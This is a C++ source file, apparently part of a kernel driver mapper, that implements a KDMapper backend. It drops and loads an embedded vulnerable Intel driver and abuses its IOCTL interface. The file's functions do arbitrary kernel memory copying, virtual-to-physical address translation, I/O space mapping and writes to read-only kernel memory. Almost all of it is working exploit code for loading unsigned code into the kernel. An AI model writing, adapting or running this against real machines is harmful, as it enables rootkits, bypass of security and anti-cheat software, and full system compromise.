#include <kZeroMapper/kZeroMapperConfig.h>

#if defined(KZEROMAPPER_ENABLE_KDMAPPER)

#include "KDMapperBackend.h"
#include "../Common/vDriverLoader.h"
#include <kZeroMapper/MapperStatus.h>
#include "intel_sys.h"

using StatusCode = kZeroMapper::StatusCode;

namespace
{
	constexpr uint32_t IntelIoctl = 0x80862007;
}

std::string KDMapperBackend::Name( ) const
{
	return pstra( "KDMapper" );
}

NTSTATUS KDMapperBackend::LoadDevice( )
{
	LOG_SEC( "[!] - [KDMapper] Loading vulnerable Intel driver" );

	auto image = Tools::DecodePEBuffer( IntelRes::Driver, sizeof( IntelRes::Driver ) );

	constexpr uint32_t statusBase = static_cast<uint32_t>( StatusCode::KDM_LoadFailed );

	const auto rawStatus = DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\Nal" ), image.data( ), image.size( ), &m_Device, statusBase );

	if ( rawStatus == STATUS_SUCCESS )
		return STATUS_SUCCESS;

	if ( rawStatus >= statusBase && rawStatus <= statusBase + 10 )
	{
		switch ( rawStatus - statusBase )
		{
		case 0: return static_cast<NTSTATUS>( StatusCode::KDM_FailedBuildDriverPath );
		case 1: return static_cast<NTSTATUS>( StatusCode::KDM_FailedWriteDriverFile );
		case 2: return static_cast<NTSTATUS>( StatusCode::KDM_FailedBuildDriverPath );
		case 3: return static_cast<NTSTATUS>( StatusCode::KDM_FailedOpenDevice );
		case 4: return static_cast<NTSTATUS>( StatusCode::KDM_DeviceAlreadyExists );
		case 5: return static_cast<NTSTATUS>( StatusCode::KDM_FailedStopExistingSvc );
		case 6: return static_cast<NTSTATUS>( StatusCode::KDM_NoOwningService );
		}
	}
	LOG_SEC( "[-] - [KDMapper] LoadAndUnload failed Status 0x%X", rawStatus );

	return rawStatus;

	//return static_cast<NTSTATUS>( StatusCode::KDM_FailedLoadVirtualDrv );
}

NTSTATUS KDMapperBackend::UnloadDevice( )
{
	if ( m_Device && m_Device != INVALID_HANDLE_VALUE )
	{
		CloseHandle( m_Device );
		m_Device = INVALID_HANDLE_VALUE;
	}

	return UnloadMapperDriver( );
}

bool KDMapperBackend::ReadMemory( uint64_t address, void* buffer, size_t size )
{
	const auto result = MemCopy( r_cast<uint64_t>( buffer ), address, size );

	if ( !result )
		LOG_SEC( "[-] - [KDMapper] ReadMemory failed va=0x%llx size=0x%llx gle=%lu", address, size, GetLastError( ) );

	return result;
}

bool KDMapperBackend::WriteMemory( uint64_t address, const void* buffer, size_t size )
{
	const auto result = MemCopy( address, r_cast<uint64_t>( buffer ), size );

	if ( !result )
		LOG_SEC( "[-] - [KDMapper] WriteMemory failed va=0x%llx size=0x%llx gle=%lu", address, size, GetLastError( ) );

	return result;
}

bool KDMapperBackend::WriteToReadOnlyMemory( uint64_t address, const void* buffer, size_t size )
{
	if ( !address || !buffer || !size )
		return false;

	uint64_t physicalAddress = 0;

	if ( !GetPhysicalAddress( address, &physicalAddress ) )
	{
		LOG_SEC( "[-] - [KDMapper] Failed to translate virtual address 0x%llx", address );
		return false;
	}

	const auto mappedPhysicalMemory = MapIoSpace( physicalAddress, s_cast<uint32_t>( size ) );

	if ( !mappedPhysicalMemory )
	{
		LOG_SEC( "[-] - [KDMapper] Failed to map IO space 0x%llx", physicalAddress );
		return false;
	}

	const auto result = WriteMemory( mappedPhysicalMemory, buffer, size );

	if ( !UnmapIoSpace( mappedPhysicalMemory, s_cast<uint32_t>( size ) ) )
		LOG_SEC( "[!] - [KDMapper] Failed to unmap IO space 0x%llx", physicalAddress );

	return result;
}

bool KDMapperBackend::CallDriver( void* inputBuffer, DWORD inputLength )
{
	DWORD bytesReturned = 0;
	return DeviceIoControl( m_Device, IntelIoctl, inputBuffer, inputLength, nullptr, 0, &bytesReturned, nullptr ) != FALSE;
}

bool KDMapperBackend::MemCopy( uint64_t destination, uint64_t source, uint64_t size )
{
	if ( !destination || !source || !size )
		return false;

	CopyMemoryBufferInfo request {};

	request.caseNumber = 0x33;
	request.source = source;
	request.destination = destination;
	request.length = size;

	return CallDriver( &request, sizeof( request ) );
}

bool KDMapperBackend::GetPhysicalAddress( uint64_t address, uint64_t* outPhysicalAddress )
{
	if ( !address || !outPhysicalAddress )
		return false;

	GetPhysAddressBufferInfo request {};

	request.caseNumber = 0x25;
	request.addressToTranslate = address;

	if ( !CallDriver( &request, sizeof( request ) ) )
		return false;

	*outPhysicalAddress = request.returnPhysicalAddress;
	return true;
}

uint64_t KDMapperBackend::MapIoSpace( uint64_t physicalAddress, uint32_t size )
{
	if ( !physicalAddress || !size )
		return 0;

	MapIoSpaceBufferInfo request {};

	request.caseNumber = 0x19;
	request.physicalAddressToMap = physicalAddress;
	request.size = size;

	if ( !CallDriver( &request, sizeof( request ) ) )
		return 0;

	return request.returnVirtualAddress;
}

bool KDMapperBackend::UnmapIoSpace( uint64_t address, uint32_t size )
{
	if ( !address || !size )
		return false;

	UnmapIoSpaceBufferInfo request {};

	request.caseNumber = 0x1A;
	request.virtAddress = address;
	request.numberOfBytes = size;

	return CallDriver( &request, sizeof( request ) );
}




#endif // KZEROMAPPER_ENABLE_KDMAPPER
